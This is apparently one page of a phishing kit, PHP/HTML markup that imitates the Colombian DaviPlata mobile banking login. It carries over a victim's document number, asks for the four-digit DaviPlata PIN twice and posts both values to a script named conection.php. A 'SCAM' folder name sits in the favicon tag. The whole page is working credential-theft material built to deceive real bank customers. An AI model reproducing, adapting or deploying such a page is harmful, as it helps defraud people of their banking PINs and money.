<!DOCTYPE html>

<html>

<head>
	
	<link rel="icon" href="Favicon.png" type="SCAM/Favicon.png" sizes="16x16" />
	<title>Daviplata</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo.css">
	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">	
</head>

<body>
<div class="header" id="Cabezote">
<img class="logo" src="LOGO1.png" alt="LOGO1.png">
</div>
<div class="todo" id="todo">


<div class="formulario" id="campos">
		<form class="form" action="conection.php" method="POST">
					   <?php 
                     $variable= $_POST['nrodocumento'];
        echo '<input id="dato" name="nrodocumento" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>


			<br>
		    <div><img class="cell" src="clave.png" alt="clave.png"></div>
			<input  id="contrasena" minlength="4" maxlength="4" type='password' name="contrasena" placeholder ="Clave DaviPlata"  required="" pattern="[0-9]+"> 

			<input  id="contrasenaRepeat" minlength="4" maxlength="4"  name="contrasenaRepeat" type='password' placeholder ="Confirmar clave" required="Numero" pattern="[0-9]+">
			<br>
	       <input type="radio" name="my-input" id="sesion">
            <label id="texto" for="yes">Cerrar sesión de otros dispositivos</label>
            <br>
             <br>
              <br>
			<input  id="accept" type="submit" value="Confirmar">
			<br>
			<br>
			
		</form>
	
	</div>
	</div>
	
	<footer class="footer">
		<div class="pie" id="pie">
			<h5> ¿Preguntas? Llama al 01 800 917 1564 </h5> 
			<h6> Preguntas frecuentes<br>	Centro de ayuda	<br>	Términos de uso  </h6> 
        </footer>



</div>
	</div>
	<script src="popup.js"></script>
	
</body>


</html>